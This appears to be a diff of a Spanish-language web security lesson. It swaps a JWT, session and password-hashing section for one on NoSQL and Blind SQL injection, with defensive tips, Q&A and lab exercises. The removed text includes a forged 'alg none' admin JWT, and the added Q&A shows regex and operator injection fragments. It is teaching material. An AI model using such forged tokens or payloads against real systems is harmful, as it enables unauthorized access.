-// Firma: "" (vacia)
-// Token resultante: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiIxMjMiLCJuYW1lIjoiSnVhbiBQZXJleiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ.
-```
-
-Conclusión: el token usa HS256 (simetrico), el payload contiene rol "user", expira en 1 hora. Las vulnerabilidades potenciales incluyen: clave secreta debil (ataque de diccionario), algoritmo none, rol definido en el token (podria modificarse).
+1. **Objetos literales en vez de strings JSON:** `{ username: safeUsername }` es seguro porque el driver no evalua los valores como codigo
+2. **bcrypt:** Hashing de contrasenas con factor de costo 12
+3. **Validacion de tipos:** Asegurar que username y password son strings
+4. **Sanitizacion:** Remover caracteres especiales NoSQL ($, {, }, (, ))
+5. **Mensajes genericos:** No revelar si el usuario existe
+6. **Manejo de errores:** No exponer detalles tecnicos
+7. **Rate limiting implicito:** El cliente puede anadirlo como middleware
 
 ---
 
 ## Preguntas y Respuestas
 
 ### Pregunta 1
-**Cual es la diferencia fundamental entre hashing y encriptacion en el contexto de contrasenas?**
+**Cual es la diferencia practica entre Blind SQL basada en booleanos y basada en tiempo?**
 
-**Respuesta:** El hashing es unidireccional: una vez que se genera el hash, no se puede revertir para obtener la contrasena original. La encriptacion es bidireccional: los datos cifrados pueden descifrarse con la clave correcta. Para contrasenas, SIEMPRE debe usarse hashing (con salt y algoritmo lento como bcrypt/Argon2), NUNCA encriptacion. Si alguien roba la clave de encriptacion, puede descifrar todas las contrasenas. Con hashing, incluso si roban la BD, las contrasenas no pueden recuperarse (solo mediante fuerza bruta del hash individual).
+**Respuesta:** La Blind SQL booleana usa diferencias observables en la respuesta (contenido HTML, codigos HTTP, redirecciones) para inferir verdadero/falso. La Blind SQL basada en tiempo se usa cuando NO hay diferencias observables, introduciendo retardos (SLEEP, WAITFOR) para inferir. La basada en tiempo es mas lenta (cada pregunta requiere 5+ segundos de espera) pero funciona en escenarios donde la booleana no es posible.
 
 ### Pregunta 2
-**Que es CSRF y como se previene con cookies seguras?**
+**Por que la inyeccion NoSQL en MongoDB puede ser mas peligrosa que la SQL tradicional?**
 
-**Respuesta:** CSRF (Cross-Site Request Forgery) es un ataque donde el atacante enga~na al navegador de la victima para que envie una peticion no deseada a un sitio donde la victima esta autenticada. Ejemplo: si estas logueado en tu banco y visitas un sitio malicioso, ese sitio puede enviar un POST para transferir dinero usando tu sesion activa. La defensa principal es el atributo `SameSite` en cookies: `SameSite=Strict` evita que la cookie se envie en peticiones de otros orígenes. Tambien se usan tokens CSRF (generados por servidor, validados en cada formulario/API).
+**Respuesta:** En MongoDB, el operador `$where` permite ejecutar JavaScript arbitrario en el motor de BD, lo que puede llevar a RCE (Remote Code Execution) completa, no solo a robo de datos. Ademas, las inyecciones NoSQL pueden explotar operadores como `$ne`, `$regex`, `$gt` para manipular la logica de consultas de formas que no tienen equivalente directo en SQL.
 
 ### Pregunta 3
-**Que es session fixation y como se previene?**
+**SQLMap puede automatizar Blind SQL injection. Como lo hace internamente?**
 
-**Respuesta:** Session fixation es un ataque donde el atacante establece (fija) el ID de sesion de la victima antes de que esta se autentique. Si la aplicacion no regenera el ID despues del login, el atacante conoce el ID de sesion valido y puede suplantar a la victima. Prevencion: despues de un login exitoso, la aplicacion debe regenerar/emitir un nuevo ID de sesion. En Flask: `session.clear()` seguido de establecer los datos. En general: `session_regenerate_id()`.
+**Respuesta:** SQLMap primero determina si el parametro es vulnerable enviando payloads que causan diferencias detectables (como `1=1` vs `1=2`). Luego, para Blind SQL basada en booleanos, usa busqueda binaria para determinar cada caracter del valor extraido (no prueba letra por letra, sino que usa comparaciones mayor/menor ASCII para converger mas rapido). Para Time-based, mide el tiempo de respuesta con alta precision y usa retardos controlados. SQLMap tambien puede usar tecnicas de inferencia estadistica cuando las diferencias son sutiles.
 
 ### Pregunta 4
-**JWT es inherentemente seguro? Que practicas debe seguirse para usarlo correctamente?**
+**Que es el operador $regex en MongoDB y como puede explotarse?**
 
-**Respuesta:** JWT no es inherentemente seguro; la seguridad depende de como se implementa. Practicas necesarias: (1) usar algoritmos asimetricos (RS256/ES256) en vez de simetricos (HS256) cuando multiples servicios verifican el token; (2) verificar siempre la firma (nunca aceptar "alg: none"); (3) validar exp, nbf, iat; (4) incluir jti (JWT ID) unico para prevenir replay; (5) usar HTTPS para evitar interceptacion; (6) almacenar JWT en HttpOnly cookie, no en localStorage (vulnerable a XSS); (7) rotar claves periodicamente; (8) no incluir datos sensibles en el payload (solo se codifica en base64, no se cifra).
+**Respuesta:** `$regex` permite busquedas por expresion regular en MongoDB. Puede explotarse si el atacante controla el patron regex. Por ejemplo, si la app construye: `{ username: { $regex: input } }`, el atacante puede enviar `^a.*` para encontrar usuarios que empiecen con 'a', `^admin` para el admin, etc. Es similar a un "Blind SQL" donde se puede inferir informacion caracter por caracter. La mitigacion es nunca permitir que el usuario controle operadores de MongoDB directamente.
 
 ### Pregunta 5
-**Cuando usar bcrypt vs Argon2? Cual es la recomendacion actual?**
+**Teniendo prepared statements, es necesario ademas tener WAF y validacion de entrada? No es redundante?**
 
-**Respuesta:** Argon2 es el algoritmo mas moderno (ganador del Password Hashing Competition 2015) y recomendado por OWASP como primera opcion. Sin embargo, bcrypt sigue siendo ampliamente usado y es seguro si se configura con rounds >= 10. Argon2 tiene tres variantes: Argon2d (resistente a GPU), Argon2i (resistente a side-channel), Argon2id (híbrido, recomendado). La recomendacion actual: usar Argon2id si la libreria esta disponible (ej: `argon2-cffi` en Python). Si no, bcrypt con rounds 12 es perfectamente aceptable. Lo importante es no usar algoritmos rapidos (MD5, SHA-256 directo, SHA-512 directo) para contrasenas.
+**Respuesta:** No es redundante, es defense in depth. Los prepared statements protegen contra inyeccion SQL en la capa de BD, pero un WAF puede bloquear ataques antes de que lleguen a la aplicacion, protegiendo contra: (1) ataques a otros componentes que no usan prepared statements, (2) vulnerabilidades en el ORM o en consultas raw residuales, (3) ataques de inyeccion NoSQL, (4) ataques de tipo log4j que no estan relacionados con BD. La validacion de entrada protege contra otros vectores (XSS, path traversal, command injection). Las capas de defensa cubren diferentes vectores y se complementan.
 
 ---
 
 ## Tarea / Lectura Recomendada
 
-1. **Leer:** OWASP Authentication Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
-2. **Leer:** OWASP Session Management Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
-3. **Leer:** JWT.io - Debugger y documentacion - https://jwt.io/
-4. **Practicar:** Implementar login con MFA (TOTP) en Flask usando la libreria `pyotp`
-5. **Profundizar:** Leer "Introduction to JWT" de Auth0 - https://auth0.com/learn/json-web-tokens
-6. **Experimentar:** Usar Burp Suite para interceptar y analizar tokens JWT en una app de prueba
+1. **Leer:** OWASP NoSQL Injection Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Cheat_Sheet.html
+2. **Practicar:** Blind SQL injection labs en PortSwigger Web Security Academy
+3. **Experimentar:** Instalar SQLMap en un entorno controlado y practicar contra DVWA (Damn Vulnerable Web Application) en Docker
+4. **Profundizar:** Leer "MongoDB Security Reference" - https://www.mongodb.com/docs/manual/security/
+5. **Herramienta:** Configurar ModSecurity con OWASP CRS (Core Rule Set) en un servidor local
+
 
 
